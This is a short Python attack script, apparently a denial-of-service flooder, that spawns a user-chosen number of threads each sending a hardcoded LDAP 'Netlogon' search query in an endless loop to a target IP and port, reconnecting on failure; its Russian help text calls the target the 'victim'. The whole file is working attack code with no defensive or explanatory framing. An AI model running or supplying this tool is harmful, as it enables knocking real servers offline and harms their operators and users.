import requests,socket,sys,threading,time
from colorama import *
import argparse
init()

banner = Fore.BLUE+'''

   ____ ___  (_)___/ /___/ / /__  _________  ____ ___  ____ ___
  / __ `__ \/ / __  / __  / / _ \/ ___/ __ \/ __ `__ \/ __ `__ \
 / / / / / / / /_/ / /_/ / /  __/ /__/ /_/ / / / / / / / / / / /
/_/ /_/ /_/_/\__,_/\__,_/_/\___/\___/\____/_/ /_/ /_/_/ /_/ /_/


'''


query =  "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
query += "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
query += "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
query += "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00"
query += "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e"
query += "\x65\x74\x6c\x6f\x67\x6f\x6e"

def Thread(ip,port):
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((ip,port))
	while True:
			
		try:
			s.sendall(bytes(query.encode()))
			time.sleep(0.400)
		except:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((ip,port))
			
	

def main():

    print(banner)
    
    parser = argparse.ArgumentParser()
    
    parser.add_argument('--threads', help='количество потоков ')
    parser.add_argument("--ip", help="IP адрес жертвы")
    parser.add_argument("--port", help="Порт жертвы")
    
    args = parser.parse_args()
    threadsi = int(args.threads)
    ip = args.ip
    port = int(args.port)
    
    threads = []
    
    try:
        for i in range(threadsi):
        	thread = threading.Thread(target=Thread,args=(ip,port),daemon=True)
        	threads.append(thread)
        	thread.start()
        	print(f'Created thread {str(i)}#')
        for thread in threads:
        	thread.join()
    except KeyboardInterrupt:
        return 0
if __name__ == "__main__":
	main()
